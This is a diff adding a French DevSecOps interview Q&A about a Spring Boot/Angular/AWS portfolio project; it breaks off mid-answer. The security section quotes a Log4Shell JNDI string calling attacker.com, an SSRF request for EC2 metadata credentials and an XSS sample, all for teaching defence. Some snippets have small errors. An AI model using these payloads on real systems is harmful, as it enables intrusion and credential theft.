+// Rôle simple
+@PreAuthorize("hasRole('ADMIN')")
+public void deleteProject(Long id) { ... }
+
+// Plusieurs rôles
+@PreAuthorize("hasAnyRole('ADMIN', 'EDITOR')")
+public void updateProject(Long id, ProjectRequest req) { ... }
+
+// L'utilisateur peut modifier son propre profil OU un admin peut modifier n'importe qui
+@PreAuthorize("hasRole('ADMIN') or #userId == authentication.principal.id")
+public void updateUser(Long userId, UserRequest req) { ... }
+
+// Accès conditionnel à la méthode ET vérification d'un paramètre
+@PreAuthorize("hasRole('ADMIN') and #req.status != null")
+public Page<Project> getProjectsByStatus(ProjectStatus status) { ... }
+```
+
+**Activation** : `@EnableMethodSecurity(prePostEnabled = true)` dans `SecurityConfig`.
+
+**Piège** : `@PreAuthorize` ne fonctionne pas sur les méthodes `private` ou appelées en interne (proxy AOP). Dans ce projet, toutes les vérifications sont sur les méthodes `public` des controllers — les services n'ont pas de `@PreAuthorize`.
+
+---
+
+### Q234 — Quelle est la différence entre G1GC et ZGC en Java 21 ?
+
+Le **Garbage Collector** libère la mémoire des objets inutilisés. Deux GC modernes en Java 21 :
+
+**G1GC** (Garbage First, défaut depuis Java 9) :
+- Divise le heap en régions
+- Pause cible configurable (`-XX:MaxGCPauseMillis=200ms`)
+- Bon équilibre latence/throughput
+- Adapté pour la plupart des applications web
+
+**ZGC** (Z Garbage Collector, productible depuis Java 15) :
+- Pauses ultra-courtes : < 1ms, peu importe la taille du heap
+- Scalable jusqu'à plusieurs TB de heap
+- Overhead CPU légèrement plus élevé
+- Idéal pour les applications latence-critique (trading, gaming, API < 5ms)
+
+Pour ce projet (t3.small, Spring Boot API REST) : **G1GC** est suffisant. La latence cible est < 200ms — G1GC la respecte aisément.
+
+**Virtual Threads (Java 21)** : orthogonal au choix du GC. Les virtual threads ne créent pas plus de pression GC que les platform threads.
+
+---
+
+### Q235 — Qu'est-ce que Spring Boot `@ConditionalOnProperty` et comment l'utiliser ?
+
+`@ConditionalOnProperty` active un bean uniquement si une propriété de configuration est présente et a une valeur donnée.
+
+```java
+// Bean activé uniquement si kafka.enabled=true
+@Configuration
+@ConditionalOnProperty(name = "kafka.enabled", havingValue = "true", matchIfMissing = false)
+public class KafkaConfig { ... }
+```
+
+Dans ce projet, Kafka peut être désactivé :
+```properties
+# application-test.properties
+kafka.enabled=false
+spring.kafka.listener.auto-startup=false
+```
+
+Avantage : le workflow DAST ZAP démarre le backend sans Kafka (`-Dspring.kafka.listener.auto-startup=false`). Sans `@ConditionalOnProperty`, Spring Boot essaierait de connecter Kafka au démarrage → timeout → échec du test DAST.
+
+C'est aussi utile pour les features flags côté backend : activer une nouvelle feature uniquement sur staging via une variable d'environnement.
+
+---
+
+## Angular Avancé (suite)
+
+### Q236 — Qu'est-ce que les composants standalone Angular et en quoi changent-ils l'architecture ?
+
+Avant Angular 14 : chaque composant devait appartenir à un `NgModule`. Les modules géraient les imports, exports, providers.
+
+**Standalone components** (Angular 14+, défaut depuis Angular 17) : chaque composant déclare ses propres dépendances.
+
+```typescript
+@Component({
+  selector: 'app-project-card',
+  standalone: true,
+  imports: [CommonModule, RouterModule, MatCardModule], // imports directs
+  template: `...`
+})
+export class ProjectCardComponent { }
+```
+
+**Avantages** :
+- Tree-shaking plus précis : Angular n'importe que ce qui est réellement utilisé
+- Moins de boilerplate : plus de `declarations`, `exports` dans les modules
+- Lazy loading simplifié : `loadComponent(() => import('./project-detail.component'))` au lieu de `loadChildren`
+
+**Dans ce projet** : migration vers standalone components en cours. Le `AppModule` est remplacé par `app.config.ts` avec `bootstrapApplication`.
+
+---
+
+### Q237 — Qu'est-ce que `computed()` et `effect()` dans Angular Signals ?
+
+Au-delà de `signal()` de base, Angular Signals offre deux primitives avancées :
+
+**`computed()`** : signal dérivé qui recalcule automatiquement quand ses dépendances changent.
+```typescript
+readonly projects = signal<Project[]>([]);
+readonly featuredProjects = computed(() =>
+  this.projects().filter(p => p.featured)
+);
+// featuredProjects se met à jour automatiquement quand projects change
+```
+
+**`effect()`** : exécute un side-effect quand un signal change (logging, analytics, synchronisation avec localStorage).
+```typescript
+constructor() {
+  effect(() => {
+    // Relance quand currentUser change
+    const user = this.authService.currentUser();
+    if (user) analytics.identify(user.id);
+  });
+}
+```
+
+**Règles** :
+- `computed()` doit être pur (pas de side effects)
+- `effect()` s'exécute dans le contexte d'injection → créer dans le constructeur ou avec `injector`
+- `effect()` se nettoie automatiquement à la destruction du composant
+
+---
+
+### Q238 — Quelle est la différence entre `switchMap`, `mergeMap`, `concatMap` et `exhaustMap` en RxJS ?
+
+Ces quatre opérateurs projettent chaque valeur source vers un Observable interne, mais gèrent différemment les valeurs concurrentes :
+
+```typescript
+searchInput$.pipe(
+  debounceTime(300),
+  switchMap(query => this.projectService.search(query))
+  // Annule la requête précédente si une nouvelle valeur arrive → PARFAIT pour la recherche
+);
+
+uploadFiles$.pipe(
+  mergeMap(file => this.uploadService.upload(file))
+  // Tous les uploads en parallèle → pour des opérations indépendantes
+);
+
+formSubmit$.pipe(
+  concatMap(data => this.projectService.create(data))
+  // Attend que chaque création soit terminée avant la suivante → ordre garanti
+);
+
+buttonClick$.pipe(
+  exhaustMap(() => this.authService.refresh())
+  // Ignore les clics pendant qu'un refresh est en cours → évite les appels dupliqués
+);
+```
+
+**Dans ce projet** :
+- Recherche de projets → `switchMap`
+- Soumission de formulaire → `exhaustMap` (évite le double submit)
+- Upload d'images → `mergeMap`
+
+---
+
+### Q239 — Comment gérez-vous l'internationalisation (i18n) dans Angular ?
+
+Deux approches principales :
+
+**Angular i18n natif** (`@angular/localize`) :
+```html
+<p i18n="@@project.description">Description du projet</p>
+```
+Génère un fichier XLIFF à traduire. `ng build --localize` crée un bundle par langue. Avantage : meilleure performance (pas de pipe), meilleur SSR. Inconvénient : rebuild complet pour chaque langue.
+
+**ngx-translate** :
+```html
+{{ 'project.description' | translate }}
+```
+Chargement dynamique des fichiers JSON de traduction. Changement de langue sans rechargement. Plus flexible mais légèrement moins performant.
+
+**Dans ce projet** : le site est en FR/EN/DE (Phase 17). L'implémentation utilise un service `TranslationService` avec détection de la langue navigateur et stockage du choix en `localStorage`. Les fichiers de traduction (`assets/i18n/fr.json`, `en.json`, `de.json`) sont chargés à la demande via `HttpClient`.
+
+---
+
+### Q240 — Qu'est-ce que l'Angular CDK et donnez des exemples d'utilisation ?
+
+Le CDK (Component Dev Kit) est la couche comportementale d'Angular Material — accessible sans le thème visuel Material.
+
+Primitives disponibles :
+- **`DragDropModule`** : drag and drop avec `cdkDrag`, `cdkDropList`. Dans ce projet : réordonnancement des projets admin.
+- **`OverlayModule`** : positionnement intelligent de popups/tooltips (gère les bords d'écran).
+- **`A11yModule`** : gestion du focus trap dans les modales (`cdkTrapFocus`), `LiveAnnouncer` pour les lecteurs d'écran.
+- **`ScrollingModule`** : virtual scrolling pour les longues listes (`<cdk-virtual-scroll-viewport>`). Seules les lignes visibles sont dans le DOM.
+- **`PortalModule`** : rendre un composant hors de sa hiérarchie DOM normale.
+
+**Avantage** : utiliser le CDK sans Angular Material → comportements robustes sans imposer le thème Material Design à toute l'équipe design.
+
+---
+
+## Container Security & Kubernetes
+
+### Q241 — Comment sécurisez-vous un container Docker (non-root, read-only, capabilities) ?
+
+Checklist de sécurité container appliquée dans ce projet :
+
+**1. Utilisateur non-root** :
+```dockerfile
+# Backend
+RUN addgroup -S appgroup && adduser -S appuser -G appgroup
+USER appuser
+```
+Un container root peut exploiter des vulnérabilités kernel. L'utilisateur `appuser` (UID 1000+) limite l'impact.
+
+**2. Filesystem en lecture seule** :
+```yaml
+# docker-compose.yml
+security_opt:
+  - no-new-privileges:true
+read_only: true
+tmpfs:
+  - /tmp  # seul /tmp est writable
+```
+
+**3. Capabilities Linux limitées** :
+```yaml
+cap_drop:
+  - ALL
+cap_add:
+  - NET_BIND_SERVICE  # seulement si port < 1024
+```
+
+**4. Pas de `--privileged`** : donne accès complet au kernel host — à ne jamais utiliser en production.
+
+**5. Image minimale** : `eclipse-temurin:21-jre-alpine` (~180MB) plutôt que `ubuntu:latest` (~900MB) — surface d'attaque réduite.
+
+---
+
+### Q242 — Qu'est-ce que les images "distroless" et quand les utiliser ?
+
+Les images distroless (projet Google) ne contiennent que l'application et ses dépendances runtime — pas de shell, pas de package manager, pas d'utilitaires système.
+
+```dockerfile
+# Multi-stage avec distroless
+FROM maven:3.9-eclipse-temurin-21 AS builder
+RUN mvn package -DskipTests
+
+FROM gcr.io/distroless/java21-debian12
+COPY --from=builder /app/target/backend.jar /app.jar
+ENTRYPOINT ["/usr/bin/java", "-jar", "/app.jar"]
+```
+
+**Avantages** :
+- Surface d'attaque minimale : si un attaquant pénètre le container, pas de shell pour exécuter des commandes
+- Taille réduite : ~50MB vs ~180MB Alpine JRE
+- Pas de CVEs liées aux utilitaires système (bash, curl, etc.)
+
+**Inconvénients** :
+- Débogage difficile : `docker exec -it container bash` → impossible (pas de shell)
+- Solution : utiliser un stage debug en dev : `FROM gcr.io/distroless/java21-debian12:debug`
+
+---
+
+### Q243 — Quelle est la différence entre `requests` et `limits` Kubernetes ?
+
+Ces deux paramètres contrôlent les ressources allouées à un pod :
+
+```yaml
+resources:
+  requests:
+    memory: "256Mi"
+    cpu: "250m"    # 0.25 core
+  limits:
+    memory: "512Mi"
+    cpu: "500m"
+```
+
+- **`requests`** : garantie minimale. Le scheduler place le pod sur un nœud ayant au moins ces ressources disponibles. Le pod y a toujours accès.
+- **`limits`** : plafond maximum. Si le pod dépasse la limite CPU → throttling. Si il dépasse la limite mémoire → **OOM Kill** (processus tué par le kernel).
+
+**Règles pratiques** :
+- Toujours définir requests ET limits (sans requests, le scheduler est aveugle)
+- `limits.memory` ≥ `requests.memory` (ne jamais les inverser)
+- Pour Spring Boot : `requests.memory: 384Mi`, `limits.memory: 512Mi` (laisser de la marge pour le GC)
+- CPU : limits élevés ou sans limite (le throttling CPU crée des problèmes de latence)
+
+---
+
+### Q244 — Quelle est la différence entre Kubernetes ConfigMap et Secret ?
+
+Les deux stockent de la configuration externalisée, mais diffèrent sur la sensibilité des données :
+
+**ConfigMap** : données non-sensibles (URLs, feature flags, config applicative)
+```yaml
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: portfolio-config
+data:
+  SPRING_PROFILES_ACTIVE: "prod"
+  BACKEND_URL: "http://backend-service:8080"
+  LOG_LEVEL: "WARN"
+```
+
+**Secret** : données sensibles (mots de passe, tokens, clés). Encodées en base64 (pas chiffrées par défaut !).
+```yaml
+apiVersion: v1
+kind: Secret
+metadata:
+  name: portfolio-secrets
+type: Opaque
+data:
+  JWT_SECRET: base64encodedvalue==
+  DB_PASSWORD: base64encodedvalue==
+```
+
+**Problème** : les Secrets Kubernetes ne sont pas chiffrés en etcd par défaut → External Secrets Operator (Phase 21) synchronise depuis AWS Secrets Manager (chiffré KMS) vers des K8s Secrets — bien plus sécurisé.
+
+---
+
+### Q245 — Qu'est-ce qu'un Kubernetes Init Container et quand l'utiliser ?
+
+Un init container s'exécute **avant** les containers principaux et doit terminer avec succès. S'il échoue, K8s redémarre le pod.
+
+Cas d'usage dans ce projet :
+```yaml
+initContainers:
+  - name: wait-for-postgres
+    image: busybox:1.35
+    command: ['sh', '-c',
+      'until nc -z postgres-service 5432; do echo waiting; sleep 2; done']
+
+  - name: run-migrations
+    image: flyway/flyway:10
+    command: ['flyway', 'migrate']
+    env:
+      - name: FLYWAY_URL
+        value: jdbc:postgresql://postgres-service:5432/portfolio
+
+containers:
+  - name: backend
+    image: backend:sha-abc123
+    # Démarre seulement si postgres est prêt ET les migrations sont passées
+```
+
+Avantages vs `depends_on` Docker Compose :
+- Séparation des responsabilités (migration dans un container dédié)
+- Kubernetes gère le cycle de vie des init containers
+- Le container principal ne démarre jamais sur une DB non migrée
+
+---
+
+## AWS Services Avancés
+
+### Q246 — Quelle est la différence entre AWS SQS, SNS et EventBridge ?
+
+Ces trois services gèrent la messagerie asynchrone, avec des cas d'usage distincts :
+
+**SQS** (Simple Queue Service) : file d'attente point-à-point. Un message est consommé par **un seul** consumer. Idéal pour le découplage et le lissage de charge.
+```
+Producer → [Queue] → Consumer unique (worker)
+```
+
+**SNS** (Simple Notification Service) : fan-out pub/sub. Un message est livré à **tous les abonnés**. Idéal pour les notifications (email, SMS, SQS, Lambda).
+```
+Publisher → [Topic] → Lambda + SQS + Email + SMS (en parallèle)
+```
+
+**EventBridge** : bus d'événements avec routage par règles. Supporte les événements AWS natifs, les événements custom, et le scheduling (cron).
+```
+Source → [Event Bus] → Règle filtre → Target (Lambda, SQS, Step Functions...)
+```
+
+**Dans ce projet** :
+- Lambda Weekly Report → déclenché par **EventBridge** (cron `0 9 ? * MON *`)
+- Si on ajoutait des notifications → **SNS** fan-out (email + Slack + SQS)
+- Si on ajoutait un worker de traitement asynchrone → **SQS** FIFO
+
+---
+
+### Q247 — Qu'est-ce qu'AWS Step Functions et dans quel cas l'utiliser ?
+
+Step Functions orchestre des workflows d'étapes avec des états (State Machine). Chaque étape peut être une Lambda, une API AWS, une tâche ECS, une attente, une condition.
+
+Exemple : workflow d'onboarding utilisateur
+```
+[Créer compte] → [Envoyer email vérification] → [Attendre vérification (24h max)]
+                                                  ↓ (non vérifié)     ↓ (vérifié)
+                                               [Supprimer]          [Activer compte]
+                                                                     [Envoyer bienvenue]
+```
+
+**Avantages vs Lambda chainées manuellement** :
+- Visualisation graphique du workflow
+- Gestion des erreurs et retries configurables par étape
+- État persistant (résiste aux pannes à mi-workflow)
+- Timeout par étape
+
+**Dans ce projet** : non utilisé (workflows Lambda simples). Step Functions serait justifié pour le resize d'images avec étapes multiples (validate → resize → webp → update DB → notify).
+
+---
+
+### Q248 — Quelles sont les différences entre AWS Inspector, GuardDuty et Macie ?
+
+Ces trois services couvrent différents aspects de la sécurité AWS :
+
+| Service | Ce qu'il surveille | Ce qu'il détecte |
+|---------|-------------------|-----------------|
+| **GuardDuty** | CloudTrail, VPC Flow Logs, DNS | Comportements anormaux (brute-force, mining, C2) |
+| **Inspector** | EC2, ECR images, Lambda | Vulnérabilités logicielles (CVEs dans l'OS et les packages) |
+| **Macie** | Buckets S3 | Données sensibles (numéros de carte, PII, secrets) dans S3 |
+
+**Dans ce projet** :
+- GuardDuty → détecte si quelqu'un accède à l'EC2 anormalement (Q222)
+- Inspector → scannerait les images ECR pour les CVEs OS (complément à Trivy qui scanne les packages app)
+- Macie → utile si des utilisateurs uploadent des documents dans S3 (formulaire de contact avec pièces jointes)
+
+---
+
+### Q249 — Comment fonctionnent les AWS Auto Scaling Groups (ASG) ?
+
+Un ASG maintient automatiquement le nombre d'instances EC2 dans une plage définie (`min`, `max`, `desired`).
+
+**Policies de scaling** :
+- **Target Tracking** : maintenir CPU ≈ 60% — la plus simple. AWS calcule les ajustements.
+- **Step Scaling** : règles par paliers (`CPU > 70% → +1 instance`, `CPU > 90% → +3 instances`)
+- **Scheduled Scaling** : pré-scaler avant un événement connu (`8h → 5 instances`, `20h → 1 instance`)
+- **Predictive Scaling** : ML prédit la charge future et scale proactivement
+
+**Avec ALB** : l'ASG s'enregistre automatiquement dans le Target Group de l'ALB. Les nouvelles instances reçoivent du trafic après le health check.
+
+**Dans ce projet** : single EC2, pas d'ASG (Free Tier, trafic faible). Pour une vraie production avec SLA, l'ASG garantit la disponibilité même en cas de panne d'une AZ.
+
+---
+
+### Q250 — Qu'est-ce que les IAM Conditions et donnez un exemple concret ?
+
+Les IAM Conditions ajoutent des contraintes contextuelles aux politiques IAM — elles permettent des règles fines basées sur l'IP, l'heure, le tag, le MFA.
+
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Action": ["s3:PutObject", "s3:GetObject"],
+    "Resource": "arn:aws:s3:::portfolio-images/*",
+    "Condition": {
+      "StringEquals": {
+        "aws:RequestedRegion": "eu-west-3"
+      },
+      "IpAddress": {
+        "aws:SourceIp": "13.39.132.25/32"
+      }
+    }
+  }]
+}
+```
+
+Cette policy autorise S3 uniquement depuis l'IP de l'EC2 et seulement en région Paris.
+
+**Conditions utiles pour DevSecOps** :
+- `aws:MultiFactorAuthPresent: true` → exiger le MFA pour les actions destructives
+- `aws:RequestedRegion` → confiner les ressources à une région (conformité RGPD)
+- `s3:prefix` → restreindre l'accès à un préfixe S3 spécifique
+- `ec2:ResourceTag/Environment: prod` → seuls les admins peuvent modifier les ressources taggées "prod"
+
+---
+
+### Q251 — Terraform vs AWS CloudFormation — quand choisir l'un ou l'autre ?
+
+| Critère | Terraform | CloudFormation |
+|---------|-----------|---------------|
+| Multi-cloud | Oui (AWS + GCP + Azure) | Non (AWS uniquement) |
+| État | Fichier state externe | Géré par AWS (natif) |
+| Syntaxe | HCL (lisible) | JSON/YAML (verbeux) |
+| Modules | Terraform Registry | Nested Stacks |
+| Drift detection | `terraform plan` | AWS Config |
+| Rollback | Manuel (`terraform destroy`) | Automatique sur échec |
+| Support AWS natif | Lag de quelques jours | Immédiat (AWS first) |
+| OSS vs propriétaire | Open source | AWS propriétaire |
+
+**Règle** :
+- AWS uniquement, équipe habituée à AWS → CloudFormation ou CDK (code TypeScript/Python)
+- Multi-cloud ou équipe déjà formée Terraform → Terraform
+- Ce projet → Terraform (lisibilité HCL, écosystème de modules, multi-cloud futur)
+
+---
+
+### Q252 — Qu'est-ce qu'AWS X-Ray et en quoi diffère-t-il d'OpenTelemetry ?
+
+**AWS X-Ray** : service de tracing distribué propriétaire AWS. Instrumentation via SDK Java/Node. Visualisation dans la console AWS (Service Map, Traces).
+
+**OpenTelemetry** : standard ouvert, vendor-neutral. Les traces peuvent être envoyées vers X-Ray, Jaeger, Zipkin, Datadog, Grafana Tempo — sans changer le code applicatif.
+
+```java
+// OpenTelemetry (code agnostique)
+Tracer tracer = GlobalOpenTelemetry.getTracer("portfolio-backend");
+Span span = tracer.spanBuilder("getProjects").startSpan();
+// Exporter changeable : OTLPExporter → X-Ray, Tempo, Jaeger...
+
+// X-Ray SDK (code couplé à AWS)
+AWSXRay.beginSubsegment("getProjects");
+```
+
+**Dans ce projet** : ni X-Ray ni OTel ne sont configurés (le tracing est la lacune identifiée en Q230). La prochaine étape serait OpenTelemetry → OTLP → Grafana Tempo, pour rester vendor-agnostic.
+
+---
+
+## Sécurité Applicative
+
+### Q253 — Comment Angular protège-t-il contre le XSS et que devez-vous éviter ?
+
+Angular échappe automatiquement toutes les valeurs interpolées `{{ }}` et les bindings `[property]` — il les traite comme du texte, pas du HTML.
+
+```typescript
+// SÉCURISÉ — Angular échappe automatiquement
+title = '<script>alert("xss")</script>';
+// Template : {{ title }} → affiche le texte brut, pas le script
+
+// DANGEREUX — bypass de la sécurité Angular
+import { DomSanitizer } from '@angular/platform-browser';
+this.sanitizer.bypassSecurityTrustHtml(userInput); // NE JAMAIS FAIRE avec des données utilisateur
+```
+
+**Ce qu'il faut éviter** :
+1. `[innerHTML]="userContent"` avec du contenu non sanitisé
+2. `bypassSecurityTrust*` sur des données externes
+3. Insérer du HTML via `ElementRef.nativeElement.innerHTML = userInput`
+
+**Dans ce projet** : les descriptions de projets viennent de l'API (données admin) — moins risquées. Si on permettait des commentaires publics, il faudrait sanitiser côté serveur (JSOUP en Java) ET laisser Angular sanitiser côté client.
+
+---
+
+### Q254 — Comment Spring Boot protège-t-il contre le CSRF, et pourquoi l'avez-vous désactivé ?
+
+**CSRF** (Cross-Site Request Forgery) : une page malveillante fait effectuer des actions à un utilisateur authentifié sur un autre site. Fonctionne parce que le navigateur envoie automatiquement les cookies de session.
+
+**Protection standard** : token CSRF dans chaque formulaire, vérifié par le serveur.
+
+**Pourquoi désactivé dans ce projet** :
+```java
+http.csrf(csrf -> csrf.disable())
+```
+
+Parce que ce projet est une **API REST stateless avec JWT** :
+1. **Pas de sessions** : le JWT est dans un header `Authorization`, pas dans un cookie. Le navigateur n'envoie pas les headers automatiquement → pas de CSRF possible.
+2. **SPA Angular** : le frontend est une application séparée qui envoie le JWT explicitement.
+3. **CORS restrictif** : seules les origines connues peuvent faire des requêtes cross-origin.
+
+**Règle** : CSRF nécessaire pour les apps avec sessions (cookies). Inutile pour les API stateless JWT.
+
+---
+
+### Q255 — Qu'est-ce que le SSRF (Server-Side Request Forgery) ?
+
+SSRF : l'attaquant fait effectuer des requêtes HTTP **par le serveur** vers des ressources internes. Le serveur devient un proxy involontaire.
+
+**Exemple** : un endpoint qui accepte une URL et la charge :
+```
+POST /api/preview
+{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role" }
+```
+Le serveur AWS répond avec les credentials temporaires de l'IAM Role EC2 → **compromission totale**.
+
+**Mitigations** :
+1. **Valider les URLs** : rejeter les IPs privées (10.x, 172.16.x, 192.168.x, 169.254.x)
+2. **IMDSv2** : AWS Instance Metadata Service v2 requiert un token préalable → protège contre le SSRF simple
+3. **Résolution DNS** : résoudre l'URL et vérifier l'IP avant la requête
+4. **Pas d'endpoint de proxy** : ne pas exposer de feature "charger une URL externe"
+
+Dans ce projet, le Lambda image-resize reçoit une URL S3 (validée par AWS SDK) — pas de SSRF possible. Les inputs utilisateur ne sont jamais utilisés comme URL de requête.
+
+---
+
+### Q256 — Quels headers de sécurité HTTP sont importants et comment les configurer ?
+
+Spring Security ajoute automatiquement certains headers. Voici la liste complète avec leur rôle :
+
+```
+# Automatiquement ajoutés par Spring Security
+X-Content-Type-Options: nosniff        → empêche le MIME sniffing
+X-Frame-Options: DENY                  → empêche le clickjacking (iframes)
+X-XSS-Protection: 0                   → désactivé (CSP le remplace)
+Cache-Control: no-cache, no-store      → pour les réponses authentifiées
+Pragma: no-cache
+
+# À ajouter manuellement pour une API REST
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+# (HSTS — force HTTPS pour 1 an, configuré côté NGINX)
+
+# Pour les pages HTML (frontend Angular)
+Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
+```
+
+**Test avec SecurityHeaders.com** : score A sur ce projet pour les headers backend. Le NGINX du frontend ajoute HSTS et CSP.
+
+---
+
+### Q257 — Comment automatiseriez-vous la rotation des secrets en production ?
+
+Rotation manuelle = risque (oubli, procédure d'urgence stressante). Rotation automatique = sécurité sans friction.
+
+**AWS Secrets Manager + Lambda rotation** :
+```
+Secrets Manager → déclenche Lambda rotation tous les 30 jours
+Lambda :
+  1. Génère un nouveau mot de passe aléatoire
+  2. Met à jour le compte PostgreSQL via ALTER USER
+  3. Met à jour le secret dans Secrets Manager
+  4. Vérifie que la connexion fonctionne avec le nouveau secret
+  5. Spring Boot relit le secret au prochain redémarrage (ou via @RefreshScope)
+```
+
+**Dans ce projet** : rotation manuelle (portfolio solo, risque faible). La configuration Terraform prévoit `rotation_rules { automatically_after_days = 30 }` mais avec `rotation_lambda_arn = null` (lambda non créée).
+
+**Pour le JWT_SECRET** : rotation = invalide tous les tokens existants → déconnecter tous les utilisateurs. Prévoir une période de transition avec l'ancien + le nouveau secret.
+
+---
+
+### Q258 — Qu'est-ce que Log4Shell (CVE-2021-44228) et quelles leçons en tirer ?
+
+Log4Shell est une vulnérabilité critique (CVSS 10.0) dans Log4j 2 (décembre 2021). Elle permettait l'exécution de code arbitraire à distance via une simple entrée de log.
+
+**Mécanisme** :
+```
+Attaquant envoie dans n'importe quel champ : ${jndi:ldap://attacker.com/exploit}
+Log4j loggue cette chaîne → évalue l'expression JNDI → contacte le serveur attaquant
+→ Télécharge et exécute du code Java malveillant → RCE (Remote Code Execution)
+```
+
+**Impact** : des millions de serveurs Java vulnérables en 72h, y compris des infrastructures critiques.
+
+**Leçons tirées dans ce projet** :
+1. **Logback, pas Log4j** : choix de Logback (SLF4J) pour ce projet — non vulnérable à Log4Shell
+2. **SBOM CycloneDX** : en cas de nouvelle CVE critique, le SBOM permet de savoir en secondes si le projet est affecté
+3. **Dependabot** : mise à jour automatique des dépendances vulnérables
+4. **OWASP Dependency Check** : bloque le build si une CVE critique est détectée
+
+---
+
+## CI/CD Avancé
+
+### Q259 — Qu'est-ce que les branch protection rules GitHub et comment les configurer ?
+
+Les branch protection rules empêchent les modifications directes sur des branches critiques (`main`, `release/*`).
+
+**Règles configurées sur `main`** dans ce projet :
+```
+✅ Require pull request reviews (1 reviewer minimum)
+✅ Dismiss stale reviews when new commits are pushed
+✅ Require status checks to pass before merging
+   → CI Backend (tests + SAST)
+   → CI Frontend (tests + lint)
+   → SonarCloud Quality Gate
+✅ Require branches to be up to date before merging
+✅ Include administrators (personne ne bypass, même le owner)
+✅ Restrict force pushes
+✅ Restrict deletions
+```
+
+**Impact DevSecOps** : personne ne peut déployer en production du code non testé, non reviewé et sans Quality Gate passé — même le propriétaire du repo. C'est le fondement du shift-left security.
+
+---
+
+### Q260 — Qu'est-ce que le Semantic Versioning (SemVer) et comment l'appliquez-vous ?
+
+SemVer définit le format `MAJOR.MINOR.PATCH` :
+- **MAJOR** : breaking change (incompatibilité API)
+- **MINOR** : nouvelle feature rétrocompatible
+- **PATCH** : bug fix rétrocompatible
+
+Exemples : `1.2.3 → 1.2.4` (bug fix), `1.2.3 → 1.3.0` (nouvelle feature), `1.2.3 → 2.0.0` (breaking change)
+
+**Conventional Commits → SemVer automatique** :
+- `fix:` → PATCH
+- `feat:` → MINOR
+- `feat!:` ou `BREAKING CHANGE:` → MAJOR
+
+Dans ce projet, les tags de release suivent SemVer. Les images ECR sont taggées avec le SHA commit (`sha-abc123`) pour l'immuabilité — le SemVer est sur les GitHub Releases.
+
+**Outil** : `semantic-release` automatise le bump de version, le changelog, et la création de GitHub Release à partir des conventional commits.
+
+---
+
+### Q261 — Qu'est-ce que les GitHub Actions Matrix Builds ?
+
+La matrix strategy permet d'exécuter un même job sur plusieurs combinaisons de paramètres en parallèle.
+
+```yaml
+jobs:
+  test:
+    strategy:
+      matrix:
+        java: [17, 21]
+        os: [ubuntu-latest, windows-latest]
+        fail-fast: false  # continue même si une combinaison échoue
+    runs-on: ${{ matrix.os }}
+    steps:
+      - uses: actions/setup-java@v4
+        with:
+          java-version: ${{ matrix.java }}
+      - run: mvn test
+```
+
+Cela génère 4 jobs parallèles : Java17/Ubuntu, Java17/Windows, Java21/Ubuntu, Java21/Windows.
+
+**Dans ce projet** : la CI backend tourne sur Java 21 uniquement (pas de compatibilité multi-version requise). La matrix serait utile pour une librairie publique qui supporte Java 17, 21 et 24.
+
+---
+
+### Q262 — Qu'est-ce que l'OIDC entre GitHub Actions et AWS, et pourquoi l'utiliser ?
+
+Sans OIDC : les credentials AWS (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`) sont stockés dans GitHub Secrets — clés permanentes, risque de fuite.
+
+Avec **OIDC** (OpenID Connect) : GitHub Actions génère un token JWT éphémère signé par GitHub. AWS STS échange ce token contre des credentials temporaires via un IAM Identity Provider.
+
+```yaml
+# Dans le workflow
+permissions:
+  id-token: write  # Autoriser GitHub à générer un OIDC token
+
+- name: Configure AWS credentials via OIDC
+  uses: aws-actions/configure-aws-credentials@v4
+  with:
+    role-to-assume: arn:aws:iam::123456789:role/github-actions-portfolio
+    aws-region: eu-west-3
+```
+
+```hcl
+# Terraform - IAM Role avec trust policy GitHub OIDC
+resource "aws_iam_role" "github_actions" {
+  assume_role_policy = jsonencode({
+    Statement = [{
+      Principal = { Federated = "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com" }
+      Condition = { StringEquals = { "token.actions.githubusercontent.com:sub": "repo:amine77/devsecops-angular-java21-aws:ref:refs/heads/main" }}
+    }]
+  })
+}
+```
+
+**Avantage** : zéro credential permanent dans GitHub. Les credentials expirent en 15 minutes. Le trust est limité à une repo et une branche spécifiques.
+
+---
+
+### Q263 — Qu'est-ce qu'un déploiement Canary et comment le différencier d'un Rolling Update ?
+
+**Rolling Update** : les anciennes instances sont remplacées progressivement par les nouvelles (1 à la fois, ou par batch). À tout moment, des instances des deux versions tournent.
+```
+v1 v1 v1 v1 → v2 v1 v1 v1 → v2 v2 v1 v1 → v2 v2 v2 v1 → v2 v2 v2 v2
+```
+
+**Canary** : 1-5% du trafic est routé vers la nouvelle version. Le reste reste sur l'ancienne. On surveille les métriques (erreurs, latence) avant d'augmenter graduellement.
+```
+95% trafic → v1    5% trafic → v2 (canary)
+→ métriques OK → 50/50 → 100% v2
+```
+
+**Dans ce projet** : rolling update Docker (`docker compose up -d backend` redémarre le container progressivement). En Kubernetes, `strategy: RollingUpdate` avec `maxUnavailable: 0, maxSurge: 1`. Le canary nécessite un ingress controller avancé (Nginx Ingress avec annotations de weight, ou Istio traffic splitting).
+
+---
+
+## Monitoring & Observabilité
+
+### Q264 — Comment provisionnez-vous les dashboards Grafana automatiquement ?
+
+Le provisioning Grafana permet de charger des dashboards et datasources depuis des fichiers — plus de configuration manuelle via l'UI.
+
+```yaml
+# grafana/provisioning/datasources/prometheus.yml
+apiVersion: 1
+datasources:
+  - name: Prometheus
+    type: prometheus
+    url: http://prometheus:9090
+    isDefault: true
+    editable: false
+```
+
+```yaml
+# grafana/provisioning/dashboards/portfolio.yml
+apiVersion: 1
+providers:
+  - name: portfolio
+    type: file
+    options:
+      path: /var/lib/grafana/dashboards
+```
+
+Les fichiers JSON des dashboards sont dans `grafana/dashboards/*.json`. Ils sont versionnés dans Git — un redéploiement recrée exactement les mêmes dashboards.
+
+**Dans ce projet** : 3 dashboards provisionnés (Portfolio Overview, Redis Cache, Kafka Metrics). `docker-compose.yml` monte les répertoires de provisioning dans le container Grafana.
+
+---
+
+### Q265 — Quelle est la différence entre l'ELK Stack et CloudWatch pour la gestion des logs ?
+
+**ELK Stack** (Elasticsearch + Logstash + Kibana) :
+- **Auto-hébergé** → contrôle total, coût fixe (infrastructure)
+- **Recherche full-text** très performante avec Elasticsearch
